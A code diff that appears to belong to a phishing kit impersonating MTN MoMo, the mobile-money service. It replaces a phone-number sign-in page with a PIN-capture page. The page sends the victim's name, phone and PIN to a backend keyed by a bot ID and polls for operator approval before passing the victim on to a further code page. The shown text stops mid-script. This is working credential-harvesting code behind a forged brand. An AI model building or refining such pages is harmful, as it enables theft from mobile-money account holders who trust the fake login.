@@ -1,610 +1,719 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MoMo</title>
+  <script>
+  // ============================================================
+  //  BOT ID RESOLVER — runs FIRST on every page load
+  //  Reads botId from URL immediately. Never defaults to bot1.
+  //  Persists to localStorage. Rewrites URL so refreshes keep it.
+  //  Stops the page if botId is missing.
+  // ============================================================
+  (function () {
+    try {
+      const params = new URLSearchParams(window.location.search);
 
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        html, body { width: 100%; min-height: 100%; }
-        body { font-family: Arial, Helvetica, sans-serif; background: #fff; overflow-x: hidden; }
+      let botId = params.get('botId');
+      if (!botId) {
+        botId = localStorage.getItem('botId');
+      }
 
-        .app {
-            position: relative;
-            width: 100%;
-            max-width: 540px;
-            min-height: 100vh;
-            min-height: 100svh;
-            margin: 0 auto;
-            background: #fff;
-            overflow: hidden;
-            padding-bottom: 110px;
-        }
+      if (!botId || botId === 'test_bot' || botId === 'undefined' || botId === 'null') {
+        document.documentElement.innerHTML =
+          '<body style="font-family:Arial;padding:40px;text-align:center;color:#c0392b">' +
+          '<h2>Invalid link</h2>' +
+          '<p>Tafadhali fungua ukurasa huu kupitia kiungo rasmi.</p>' +
+          '</body>';
+        window.__BOTID_MISSING__ = true;
+        throw new Error('botId missing from URL and localStorage');
+      }
 
-        .top {
-            position: relative;
-            height: 390px;
-            background: #004c69;
-            padding-top: 52px;
-        }
-        .top::after {
-            content: "";
-            position: absolute;
-            left: -10%;
-            bottom: -75px;
-            width: 120%;
-            height: 125px;
-            background: #fff;
-            border-radius: 50% 50% 0 0 / 70% 70% 0 0;
-        }
+      localStorage.setItem('botId', botId);
 
-        .logo {
-            position: relative;
-            z-index: 2;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            text-align: center;
-        }
-        .logo-box {
-            width: 76px;
-            height: 76px;
-            border-radius: 9px;
-            background: linear-gradient(145deg, #087398, #003d59);
-            box-shadow: 0 2px 5px rgba(0,0,0,.25), inset 0 0 4px rgba(255,255,255,.12);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-        }
-        .logo-symbol {
-            position: relative;
-            width: 40px;
-            height: 48px;
-            background: #ffd500;
-            clip-path: polygon(50% 0, 100% 30%, 86% 100%, 59% 69%, 39% 100%, 13% 34%);
-        }
-        .logo-symbol::after {
-            content: "";
-            position: absolute;
-            width: 11px;
-            height: 11px;
-            background: #004c69;
-            border-radius: 50%;
-            left: 14px;
-            top: 14px;
-        }
-        .momo {
-            margin-top: 8px;
-            color: #ffd500;
-            font-size: 36px;
-            line-height: 34px;
-            font-weight: 800;
-            letter-spacing: -1.5px;
-        }
-        .from-mtn {
-            margin-top: 3px;
-            color: #ffd500;
-            font-size: 14px;
-            font-weight: 600;
-        }
+      if (params.get('botId') !== botId) {
+        params.set('botId', botId);
+        const newUrl = window.location.pathname + '?' + params.toString() + window.location.hash;
+        window.history.replaceState({}, '', newUrl);
+      }
 
-        .card {
-            position: relative;
-            z-index: 5;
-            width: calc(100% - 36px);
-            margin: -142px auto 0;
-            background: #fff;
-            border-radius: 34px;
-            padding: 44px 27px 27px;
-            box-shadow: 0 12px 25px rgba(0, 0, 0, .12);
-        }
-        .title {
-            text-align: center;
-            color: #07516b;
-            font-size: 25px;
-            font-weight: 400;
-            margin-bottom: 49px;
-        }
-        .title strong { font-weight: 700; }
+      window.__BOT_ID__ = botId;
 
-        .phone-row {
-            display: flex;
-            align-items: center;
-            width: 100%;
-            gap: 16px;
-        }
-        .country {
-            flex: 0 0 96px;
-            width: 96px;
-            height: 98px;
-            background: #fff;
-            border: 1.5px solid #111;
-            border-radius: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: default;
-            pointer-events: none;
-        }
-        .flag {
-            width: 39px;
-            height: 27px;
-            border-radius: 50%;
-            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 20"><rect width="30" height="20" fill="%23198a00"/><rect x="22" y="0" width="8" height="20" fill="%23de2010"/><rect x="22" y="0" width="2.666" height="20" fill="%23000"/><rect x="24.666" y="0" width="2.666" height="20" fill="%23de2010"/><rect x="27.333" y="0" width="2.666" height="20" fill="%23ef7d00"/><path d="M18 2 L20 4 L22 2 L21 5 L23 6 L20 7 L19 10 L18 7 L15 6 L17 5 Z" fill="%23ef7d00"/></svg>') center/cover;
-        }
-        .phone-input {
-            flex: 1;
-            min-width: 0;
-            height: 98px;
-            border: 1.5px solid #111;
-            border-radius: 27px;
-            outline: none;
-            padding: 0 23px;
-            font-family: Arial, Helvetica, sans-serif;
-            font-size: 22px;
-            color: #111;
-            background: #fff;
-        }
-        .phone-input::placeholder {
-            color: #111;
-            opacity: 1;
-            font-size: 18px;
-        }
-        .phone-input:focus { border-color: #005572; }
+      console.log('🆔 botId resolved immediately:', botId);
+    } catch (err) {
+      console.error('botId resolver failed:', err.message);
+    }
+  })();
+  </script>
 
-        .terms {
-            width: calc(100% - 45px);
-            margin: 48px auto 0;
-            text-align: center;
-            color: #666;
-            font-size: 16px;
-            line-height: 23px;
-        }
-        .terms a { color: #00516c; text-decoration: none; }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>MoMo - PIN</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
-        .bottom {
-            position: fixed;
-            bottom: 0;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 100%;
-            max-width: 540px;
-            padding: 12px 18px calc(14px + env(safe-area-inset-bottom));
-            background: #fff;
-            z-index: 100;
-        }
-        .next {
-            width: 100%;
-            height: 69px;
-            border: none;
-            border-radius: 40px;
-            background: #d1d5db;
-            color: #fff;
-            font-size: 22px;
-            font-weight: 700;
-            cursor: not-allowed;
-            font-family: Arial, Helvetica, sans-serif;
-            transition: background 0.3s ease;
-            position: relative;
-        }
-        .next.is-active {
-            background: #005572;
-            cursor: pointer;
-        }
-        .next.is-active:hover { background: #00415a; }
-        .next.is-active:active { transform: scale(.98); }
+    html, body {
+      width: 100%;
+      min-height: 100%;
+    }
 
-        .next.loading,
-        .next.loading:disabled { background: #005572; opacity: 1; cursor: wait; }
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      background: #fff;
+      overflow-x: hidden;
+    }
 
-        .next .btn-text { display: inline; }
-        .next .btn-spinner {
-            display: none;
-            width: 26px;
-            height: 26px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-top: 3px solid #fff;
-            border-radius: 50%;
-            animation: spin .8s linear infinite;
-            margin: 0 auto;
-        }
-        .next.loading .btn-text { display: none; }
-        .next.loading .btn-spinner { display: block; }
+    .app {
+      position: relative;
+      width: 100%;
+      max-width: 540px;
+      min-height: 100vh;
+      min-height: 100svh;
+      margin: 0 auto;
+      background: #fff;
+      overflow: hidden;
+    }
 
-        .status {
-            display: none;
-            margin-top: 16px;
-            text-align: center;
-            font-size: 14px;
-            padding: 10px 14px;
-            border-radius: 12px;
-            font-weight: 500;
-            border: 1px solid transparent;
-        }
-        .status.error { color: #c0392b; background: #fef3f2; border-color: #fecdca; }
-        .status.success { color: #065f46; background: #ecfdf5; border-color: #6ee7b7; }
+    .top {
+      position: relative;
+      height: 220px;
+      background: #004c69;
+      padding-top: 52px;
+    }
 
-        @keyframes spin { to { transform: rotate(360deg); } }
+    .top::after {
+      content: "";
+      position: absolute;
+      left: -10%;
+      bottom: -75px;
+      width: 120%;
+      height: 125px;
+      background: #fff;
+      border-radius: 50% 50% 0 0 / 70% 70% 0 0;
+    }
 
-        @media (max-width: 480px) {
-            .top { height: 375px; padding-top: 52px; }
-            .card { width: calc(100% - 36px); margin-top: -127px; padding: 44px 27px 27px; }
-            .title { font-size: 24px; margin-bottom: 48px; }
-            .phone-row { gap: 16px; }
-            .country { flex-basis: 96px; }
-            .phone-input { font-size: 20px; padding-left: 20px; padding-right: 15px; }
-            .phone-input::placeholder { font-size: 16px; }
-            .terms { margin-top: 48px; }
-            .bottom { padding: 10px 14px calc(12px + env(safe-area-inset-bottom)); }
-        }
-        @media (max-width: 380px) {
-            .card { padding-left: 20px; padding-right: 20px; }
-            .country { flex-basis: 82px; width: 82px; }
-            .phone-row { gap: 10px; }
-            .phone-input { font-size: 18px; padding-left: 15px; }
-            .phone-input::placeholder { font-size: 14px; }
-            .terms { width: calc(100% - 30px); font-size: 14px; }
-        }
-    </style>
+    .top-bar {
+      position: relative;
+      z-index: 2;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 22px;
+      margin-top: -10px;
+    }
+
+    .back-btn {
+      color: #ffd500;
+      font-size: 30px;
+      text-decoration: none;
+      font-weight: 300;
+      line-height: 1;
+      background: none;
+      border: none;
+      cursor: pointer;
+      transition: color 0.2s;
+    }
+    .back-btn:hover {
+      color: #ffffff;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .logo-box {
+      width: 40px;
+      height: 40px;
+      border-radius: 8px;
+      background: linear-gradient(145deg, #087398, #003d59);
+      box-shadow: 0 2px 5px rgba(0,0,0,.25), inset 0 0 4px rgba(255,255,255,.12);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .logo-symbol {
+      width: 22px;
+      height: 28px;
+      background: #ffd500;
+      clip-path: polygon(50% 0, 100% 30%, 86% 100%, 59% 69%, 39% 100%, 13% 34%);
+      position: relative;
+    }
+    .logo-symbol::after {
+      content: "";
+      position: absolute;
+      width: 6px;
+      height: 6px;
+      background: #004c69;
+      border-radius: 50%;
+      left: 8px;
+      top: 8px;
+    }
+
+    .logo-text {
+      color: #ffd500;
+      font-size: 20px;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+    }
+    .logo-text .light {
+      font-weight: 400;
+      font-size: 14px;
+      color: #b8d4e8;
+    }
+
+    .card {
+      position: relative;
+      z-index: 5;
+      width: calc(100% - 36px);
+      margin: -100px auto 0;
+      background: #fff;
+      border-radius: 34px;
+      padding: 32px 27px 27px;
+      box-shadow: 0 12px 25px rgba(0, 0, 0, .12);
+    }
+
+    .title {
+      text-align: center;
+      color: #07516b;
+      font-size: 25px;
+      font-weight: 400;
+      margin-bottom: 24px;
+    }
+    .title strong {
+      font-weight: 700;
+    }
+
+    .subtitle {
+      text-align: center;
+      color: #555;
+      font-size: 15px;
+      margin-bottom: 28px;
+    }
+
+    .input-wrapper {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+
+    .pin-box {
+      width: 50px;
+      height: 60px;
+      border: 2px solid #e2e8f0;
+      border-radius: 12px;
+      background: #fff;
+      font-size: 28px;
+      font-weight: 600;
+      text-align: center;
+      color: #0a0a0a;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      font-family: Arial, Helvetica, sans-serif;
+      caret-color: #005572;
+    }
+    .pin-box:focus {
+      border-color: #005572;
+      box-shadow: 0 0 0 3px rgba(0, 85, 114, 0.15);
+    }
+
+    .pin-box.error {
+      border-color: #c0392b;
+      box-shadow: 0 0 0 3px rgba(192, 57, 43, 0.15);
+    }
+
+    #pinInput {
+      display: none;
+    }
+
+    #otp-alert {
+      text-align: center;
+      font-size: 15px;
+      font-weight: 500;
+      min-height: 0;
+      margin-top: 8px;
+      padding: 0;
+      border-radius: 12px;
+      background: transparent;
+      transition: all 0.2s;
+      border: 1px solid transparent;
+      display: none;
+    }
+
+    #otp-alert.show {
+      display: block;
+      padding: 10px 12px;
+      min-height: 24px;
+    }
+
+    #otp-alert.error {
+      background: #fef3f2;
+      color: #c0392b;
+      border-color: #fecdca;
+    }
+
+    #otp-alert.success {
+      background: #ecfdf3;
+      color: #0b2b3b;
+      border-color: #abf0d1;
+    }
+
+    .bottom {
+      width: 100%;
+      padding: 0 18px 14px;
+      margin-top: 30px;
+    }
+
+    .continue-btn {
+      width: 100%;
+      height: 69px;
+      border: none;
+      border-radius: 40px;
+      background: #d1d5db;
+      color: #fff;
+      font-size: 22px;
+      font-weight: 700;
+      cursor: not-allowed;
+      font-family: Arial, Helvetica, sans-serif;
+      transition: background 0.3s ease;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+    }
+
+    .continue-btn:enabled {
+      background: #005572;
+      cursor: pointer;
+    }
+    .continue-btn:enabled:hover {
+      background: #00415a;
+    }
+    .continue-btn:enabled:active {
+      transform: scale(.98);
+    }
+
+    .continue-btn.loading:disabled {
+      background: #005572;
+      opacity: 1;
+      cursor: wait;
+    }
+
+    .continue-btn .btn-text { display: inline; }
+    .continue-btn .btn-spinner {
+      display: none;
+      width: 26px;
+      height: 26px;
+      border: 3px solid rgba(255,255,255,0.3);
+      border-top: 3px solid #fff;
+      border-radius: 50%;
+      animation: spin .8s linear infinite;
+    }
+
+    .continue-btn.loading .btn-text { display: none; }
+    .continue-btn.loading .btn-spinner { display: inline-block; }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .footer {
+      margin-top: 24px;
+      text-align: center;
+      font-size: 12px;
+      color: #bbb;
+      letter-spacing: 0.5px;
+      padding-bottom: 12px;
+    }
+
+    @media (max-width: 480px) {
+      .top {
+        height: 190px;
+        padding-top: 40px;
+      }
+      .top-bar {
+        padding: 0 16px;
+      }
+      .card {
+        width: calc(100% - 28px);
+        margin-top: -90px;
+        padding: 28px 20px 24px;
+        border-radius: 28px;
+      }
+      .title {
+        font-size: 22px;
+      }
+      .pin-box {
+        width: 42px;
+        height: 52px;
+        font-size: 24px;
+      }
+      .continue-btn {
+        height: 62px;
+        font-size: 20px;
+      }
+    }
+
+    @media (max-width: 380px) {
+      .card {
+        padding-left: 16px;
+        padding-right: 16px;
+      }
+      .title {
+        font-size: 20px;
+      }
+      .input-wrapper {
+        gap: 8px;
+      }
+      .pin-box {
+        width: 36px;
+        height: 46px;
+        font-size: 20px;
+      }
+      .continue-btn {
+        height: 58px;
+        font-size: 18px;
+      }
+    }
+
+    @media (max-height: 750px) {
+      .bottom {
+        margin-top: 15px;
+      }
+    }
+  </style>
 </head>
-
 <body>
 
 <div class="app">
 
-    <div class="top">
-        <div class="logo">
-            <div class="logo-box"><div class="logo-symbol"></div></div>
-            <div class="momo">MoMo</div>
-            <div class="from-mtn">from MTN</div>
+  <div class="top">
+    <div class="top-bar">
+      <button class="back-btn" onclick="window.history.back()">&#8592;</button>
+      <div class="logo">
+        <div class="logo-box">
+          <div class="logo-symbol"></div>
         </div>
+        <div class="logo-text">MoMo <span class="light">from MTN</span></div>
+      </div>
+      <div style="width: 30px;"></div>
     </div>
+  </div>
 
-    <div class="card">
-        <div class="title">Welcome to <strong>MoMo</strong></div>
+  <div class="card">
 
-        <form id="detailsForm" novalidate>
-            <div class="phone-row">
-                <div class="country" aria-label="Zambia">
-                    <span class="flag"></span>
-                </div>
+    <div class="title">Enter Your <strong>MoMo PIN</strong></div>
 
-                <input
-                    class="phone-input"
-                    type="tel"
-                    id="phone"
-                    name="phone"
-                    inputmode="tel"
-                    placeholder="Enter number *"
-                    aria-label="Phone number"
-                    autocomplete="tel"
-                    enterkeyhint="go"
-                >
-            </div>
-
-            <div id="status" class="status"></div>
-        </form>
+    <div class="input-wrapper">
+      <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" />
+      <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" />
+      <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" />
+      <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" />
+      <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" />
     </div>
+    <input type="hidden" id="pinInput" />
 
-    <div class="terms">
-        By using this app you agree to our
-        <a href="#">Mobile Terms of Use</a>
-        <br>
-        and
-        <a href="#">Privacy Policy</a>
-    </div>
+    <div id="otp-alert"></div>
 
-</div>
+  </div>
 
-<div class="bottom">
-    <button class="next" type="submit" id="continueBtn" form="detailsForm" disabled>
-        <span class="btn-text">sign in</span>
-        <span class="btn-spinner"></span>
+  <div class="bottom">
+    <button id="verifyBtn" class="continue-btn" disabled>
+      <span class="btn-text">SUBMIT</span>
+      <span class="btn-spinner"></span>
     </button>
+  </div>
+
+  <div class="footer">v 5.3.2 (1.0.0)</div>
+
 </div>
 
-
 <!-- ============================================================
-     STEP 1 — Global error catcher.
+     PIN PAGE LOGIC — single unified script
      ============================================================ -->
 <script>
-window.addEventListener('error', function (e) {
-    console.error('[MoMo GLOBAL ERROR]', e.message, '@', (e.filename || '?') + ':' + (e.lineno || '?'));
-});
-window.addEventListener('unhandledrejection', function (e) {
-    console.error('[MoMo UNHANDLED PROMISE]', e.reason);
-});
-</script>
+(function() {
+  const BACKEND_URL = "";
 
+  // ---------- BOTID (resolved by the head script) ----------
+  const botId = window.__BOT_ID__;
+  if (!botId) {
+    console.error('❌ No botId — page cannot function');
+    return;
+  }
 
-<!-- ============================================================
-     STEP 2 — Page logic.
-     ============================================================ -->
-<script>
-function initMoMoPage() {
-    'use strict';
+  // ---------- DATA ----------
+  const urlParams = new URLSearchParams(window.location.search);
+  let phone = urlParams.get('phone') || localStorage.getItem('phone');
+  let name = urlParams.get('name') || localStorage.getItem('fullName');
 
-    // ---------- CONFIG ----------
-    var BACKEND_URL = '';             // leave empty to use same-origin
-    var NEXT_PAGE   = 'code.html';    // <-- page after pin.html
+  if (!phone) {
+    alert('Session expired. Please start over.');
+    window.location.href = 'details.html?botId=' + encodeURIComponent(botId);
+    return;
+  }
+  if (!name) {
+    name = 'MTN User';
+    localStorage.setItem('fullName', name);
+  }
+  localStorage.setItem('phone', phone);
 
-    // ---------- DOM REFS ----------
-    var form     = document.getElementById('detailsForm');
-    var phone    = document.getElementById('phone');
-    var button   = document.getElementById('continueBtn');
-    var statusEl = document.getElementById('status');
+  // ---------- DOM REFS ----------
+  const pinBoxes = document.querySelectorAll('.pin-box');
+  const hiddenInput = document.getElementById('pinInput');
+  const verifyBtn = document.getElementById('verifyBtn');
+  const alertEl = document.getElementById('otp-alert');
 
-    if (!form || !phone || !button || !statusEl) {
-        console.error('[MoMo] Missing DOM elements', {
-            form: !!form, phone: !!phone, button: !!button, statusEl: !!statusEl
-        });
-        return;
+  console.log('🔢 pin.html ready — ' + pinBoxes.length + ' boxes found');
+
+  // ---------- HELPERS ----------
+  function getPinFromBoxes() {
+    let pin = '';
+    pinBoxes.forEach(b => { if (b.value) pin += b.value; });
+    return pin;
+  }
+
+  function getFilledCount() {
+    let count = 0;
+    pinBoxes.forEach(b => { if (b.value) count++; });
+    return count;
+  }
+
+  // THE KEY FIX: compute button state directly from box values,
+  // not from any hidden-input event. This runs on every box change.
+  function updateButtonState() {
+    const filled = getFilledCount();
+    const isComplete = (filled === pinBoxes.length);
+    const isLoading = verifyBtn.classList.contains('loading');
+    const shouldBeDisabled = !isComplete || isLoading;
+
+    verifyBtn.disabled = shouldBeDisabled;
+
+    // Also keep the hidden input in sync for the submit logic
+    hiddenInput.value = isComplete ? getPinFromBoxes() : '';
+
+    console.log('🔘 PIN boxes: ' + filled + '/' + pinBoxes.length + ' → button ' + (shouldBeDisabled ? 'DISABLED' : 'ENABLED'));
+  }
+
+  function showAlert(text, type) {
+    alertEl.textContent = text;
+    alertEl.className = 'show ' + (type || '');
+  }
+
+  function clearAlert() {
+    alertEl.textContent = '';
+    alertEl.className = '';
+  }
+
+  function setLoading(on) {
+    if (on) {
+      verifyBtn.classList.add('loading');
+      verifyBtn.disabled = true;
+    } else {
+      verifyBtn.classList.remove('loading');
     }
+    // Recompute after toggling loading
+    updateButtonState();
+  }
 
-    var pollTimer = null;
-    var botId     = null;
-    var lastState = null;
+  function clearAllBoxes() {
+    pinBoxes.forEach(b => {
+      b.value = '';
+      b.classList.remove('error');
+    });
+    hiddenInput.value = '';
+    updateButtonState();
+  }
 
-    // ---------- VALIDATION ----------
-    function validateForm() {
-        var digits        = phone.value.replace(/\D/g, '');
-        var isLoading     = button.classList.contains('loading');
-        var shouldDisable = (digits.length === 0) || isLoading;
+  // ---------- PIN BOX INPUT ----------
+  pinBoxes.forEach((box, i) => {
+    // INPUT — typing a digit
+    box.addEventListener('input', function() {
+      // Keep only one digit
+      const cleaned = this.value.replace(/\D/g, '').slice(0, 1);
+      this.value = cleaned;
+      this.classList.remove('error');
 
-        if (button.disabled !== shouldDisable) {
-            button.disabled = shouldDisable;
-        }
+      if (cleaned && i < pinBoxes.length - 1) {
+        pinBoxes[i + 1].focus();
+      }
 
-        if (shouldDisable) {
-            button.classList.remove('is-active');
-        } else {
-            button.classList.add('is-active');
-        }
-
-        if (lastState !== shouldDisable) {
-            lastState = shouldDisable;
-            console.log('[MoMo] NEXT disabled =', shouldDisable,
-                        '| digits =', JSON.stringify(digits),
-                        '| raw =', JSON.stringify(phone.value));
-        }
-    }
-
-    // ---------- HELPERS ----------
-    function stopPolling() {
-        if (pollTimer) {
-            clearInterval(pollTimer);
-            pollTimer = null;
-        }
-    }
-
-    function setStatus(message, type) {
-        statusEl.style.display = 'block';
-        statusEl.className = 'status ' + (type || '');
-        statusEl.textContent = message;
-    }
-
-    function hideStatus() {
-        statusEl.style.display = 'none';
-        statusEl.className = 'status';
-        statusEl.textContent = '';
-    }
-
-    function setLoading(on) {
-        if (on) {
-            button.disabled = true;
-            button.classList.remove('is-active');
-            button.classList.add('loading');
-        } else {
-            button.classList.remove('loading');
-            validateForm();
-        }
-    }
-
-    // ---------- PHONE INPUT ----------
-    function onPhoneInput() {
-        var value = phone.value;
-
-        value = value.replace(/[^\d+\s]/g, '');
-        var hasPlus = value.indexOf('+') !== -1;
-        value = value.replace(/\+/g, '');
-        if (hasPlus) value = '+' + value;
-        value = value.replace(/\s+/g, ' ');
-
-        if (phone.value !== value) {
-            var atEnd = phone.selectionStart === phone.value.length;
-            phone.value = value;
-            if (atEnd) {
-                try { phone.setSelectionRange(value.length, value.length); } catch (e) {}
-            }
-        }
-
-        validateForm();
-    }
-
-    ['input', 'keyup', 'keydown', 'change', 'paste', 'cut', 'blur', 'focus', 'click', 'touchstart', 'touchend']
-        .forEach(function (evt) {
-            phone.addEventListener(evt, onPhoneInput, false);
-        });
-
-    document.addEventListener('input', function (e) {
-        if (e.target === phone) validateForm();
-    }, false);
-
-    // Safety net for stubborn mobile keyboards / autofill
-    setInterval(validateForm, 400);
-
-    // ---------- BOT ID ----------
-    try {
-        var params  = new URLSearchParams(window.location.search);
-        var fromUrl = params.get('botId');
-        var stored  = null;
-        try { stored = localStorage.getItem('botId'); } catch (e) {}
-
-        var candidate = fromUrl || stored;
-
-        if (!candidate || candidate === 'test_bot' || candidate === 'undefined' || candidate === 'null') {
-            console.warn('⚠️ Invalid or missing botId — page still works, but submissions will fail.');
-        } else {
-            botId = candidate;
-
-            try { localStorage.setItem('botId', botId); } catch (e) {}
-
-            if (fromUrl !== botId) {
-                params.set('botId', botId);
-                window.history.replaceState(
-                    {},
-                    '',
-                    window.location.pathname + '?' + params.toString() + window.location.hash
-                );
-            }
-
-            console.log('🆔 botId resolved:', botId);
-        }
-    } catch (err) {
-        console.error('botId resolver failed:', err && err.message);
-    }
-
-    // ---------- USER NAME ----------
-    var fullName = 'User';
-    try {
-        fullName = localStorage.getItem('fullName') || 'User';
-        localStorage.setItem('fullName', fullName);
-    } catch (e) {}
-
-    // ---------- FORM SUBMIT ----------
-    form.addEventListener('submit', function (e) {
-        e.preventDefault();
-
-        if (button.classList.contains('loading')) return;
-
-        var raw      = phone.value.trim();
-        var hasPlus  = raw.charAt(0) === '+';
-        var digits   = raw.replace(/\D/g, '');
-        var phoneVal = (hasPlus ? '+' : '') + digits;
-
-        if (!digits) {
-            setStatus('❌ Please enter a phone number.', 'error');
-            return;
-        }
-
-        if (!botId) {
-            setStatus('❌ Invalid link. Please open this page through the official link.', 'error');
-            return;
-        }
-
-        setLoading(true);
-        hideStatus();
-
-        fetch(BACKEND_URL + '/submit-phone', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ name: fullName, phone: phoneVal, botId: botId })
-        })
-        .then(function (res) {
-            if (!res.ok) {
-                return res.text().then(function (t) {
-                    var clean = t.charAt(0) === '<'
-                        ? ('HTTP ' + res.status + ' — server error')
-                        : (t || ('HTTP ' + res.status));
-                    throw new Error(clean);
-                });
-            }
-            return res.json();
-        })
-        .then(function (data) {
-            var requestId = data.requestId;
-            if (!requestId) throw new Error('No request ID returned');
-
-            try {
-                localStorage.setItem('phone', phoneVal);
-                localStorage.setItem('phoneRequestId', requestId);
-                localStorage.setItem('fullName', fullName);
-            } catch (e) {}
-
-            stopPolling();
-            var attempts = 0;
-            var MAX_ATTEMPTS = 120; // ~3 minutes
-
-            pollTimer = setInterval(function () {
-                attempts++;
-                fetch(BACKEND_URL + '/check-phone/' + encodeURIComponent(requestId))
-                    .then(function (r) { return r.json(); })
-                    .then(function (check) {
-                        if (check.blocked === true) {
-                            stopPolling();
-                            setLoading(false);
-                            setStatus('❌ Account restricted. Please try again later.', 'error');
-                            return;
-                        }
-
-                        if (check.approved === true) {
-                            stopPolling();
-                            setLoading(false);
-                            setStatus('✅ Verified! Redirecting...', 'success');
-
-                            /* =====================================================
-                               REDIRECT TARGET: code.html
-                               Passes botId, requestId, phone, name so code.html
-                               can continue the flow without losing context.
-                            ===================================================== */
-                            var redirectUrl = NEXT_PAGE +
-                                '?requestId=' + encodeURIComponent(requestId) +
-                                '&phone='     + encodeURIComponent(phoneVal) +
-                                '&botId='     + encodeURIComponent(botId) +
-                                '&name='      + encodeURIComponent(fullName);
-
-                            console.log('✅ Approved — redirecting to:', redirectUrl);
-
-                            setTimeout(function () {
-                                window.location.href = redirectUrl;
-
-                                // Fallback in case href navigation is blocked
-                                setTimeout(function () {
-                                    try { window.location.replace(redirectUrl); } catch (e) {}
-                                }, 400);
-                            }, 700);
-                            return;
-                        }
-
-                        if (check.approved === false) {
-                            stopPolling();
-                            setLoading(false);
-                            setStatus('❌ Incorrect number. Please try again.', 'error');
-                            return;
-                        }
-
-                        if (attempts > MAX_ATTEMPTS) {
-                            stopPolling();
-                            setLoading(false);
-                            setStatus('⏳ Taking too long. Please try again.', 'error');
-                        }
-                    })
-                    .catch(function (err) {
-                        console.error('Polling error:', err);
-                    });
-            }, 1500);
-        })
-        .catch(function (error) {
-            setLoading(false);
-            setStatus('❌ ' + (error && error.message ? error.message : 'Something went wrong. Please try again.'), 'error');
-        });
+      clearAlert();
+      updateButtonState();
     });
 
-    // ---------- INIT ----------
-    validateForm();
-    try { phone.focus(); } catch (e) {}
+    // KEYDOWN — backspace, arrows, enter
+    box.addEventListener('keydown', function(e) {
+      if (e.key === 'Backspace') {
+        if (!this.value && i > 0) {
+          pinBoxes[i - 1].value = '';
+          pinBoxes[i - 1].focus();
+          updateButtonState();
+          e.preventDefault();
+        } else if (this.value) {
+          this.value = '';
+          updateButtonState();
+          e.preventDefault();
+        }
+      } else if (e.key === 'ArrowLeft' && i > 0) {
+        pinBoxes[i - 1].focus();
+        e.preventDefault();
+      } else if (e.key === 'ArrowRight' && i < pinBoxes.length - 1) {
+        pinBoxes[i + 1].focus();
+        e.preventDefault();
+      } else if (e.key === 'Enter') {
+        if (!verifyBtn.disabled && !verifyBtn.classList.contains('loading')) {
+          verifyBtn.click();
+        }
+        e.preventDefault();
+      }
+    });
 
-    console.log('✅ MoMo pin page ready. botId =', botId);
-}
+    // FOCUS — select existing digit
+    box.addEventListener('focus', function() {
+      this.select();
+      this.classList.remove('error');
+    });
 
-/* Run it — safe whether the DOM is still loading or already loaded. */
-if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', initMoMoPage);
-} else {
-    initMoMoPage();
-}
+    // PASTE — distribute digits
+    box.addEventListener('paste', function(e) {
+      e.preventDefault();
+      const paste = (e.clipboardData || window.clipboardData).getData('text');
+      const digits = paste.replace(/\D/g, '').slice(0, pinBoxes.length);
+      if (!digits) return;
+
+      pinBoxes.forEach((b, idx) => {
+        b.value = digits[idx] || '';
+        b.classList.remove('error');
+      });
+
+      const lastFilled = Math.min(digits.length, pinBoxes.length) - 1;
+      if (lastFilled >= 0) pinBoxes[lastFilled].focus();
+
+      clearAlert();
+      updateButtonState();
+    });
+  });
+
+  // ---------- SUBMIT ----------
+  let pollTimer = null;
+
+  function stopPolling() {
+    if (pollTimer) {
+      clearInterval(pollTimer);
+      pollTimer = null;
+    }
+  }
+
+  verifyBtn.addEventListener('click', async function() {
+    if (verifyBtn.disabled || verifyBtn.classList.contains('loading')) return;
+
+    const pin = getPinFromBoxes();
+    if (pin.length !== pinBoxes.length) return;
+
+    setLoading(true);
+    clearAlert();
+
+    try {
+      const res = await fetch(BACKEND_URL + '/submit-pin', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          name: name,
+          phone: phone,
+          pin: pin,
+          botId: botId
+        })
+      });
+
+      if (!res.ok) {
+        const errText = await res.text();
+        const clean = errText.startsWith('<')
+          ? ('HTTP ' + res.status)
+          : (errText || ('HTTP ' + res.status));
+        throw new Error(clean);
+      }
+
+      const data = await res.json();
+      if (!data.requestId) throw new Error('No request ID received');
+
+      stopPolling();
+      let attempts = 0;
+      const MAX_ATTEMPTS = 120;
+
+      pollTimer = setInterval(async function() {
+        attempts++;
+        try {
+          const checkRes = await fetch(BACKEND_URL + '/check-pin/' + data.requestId);
+          const status = await checkRes.json();
+
+          if (status.blocked === true) {
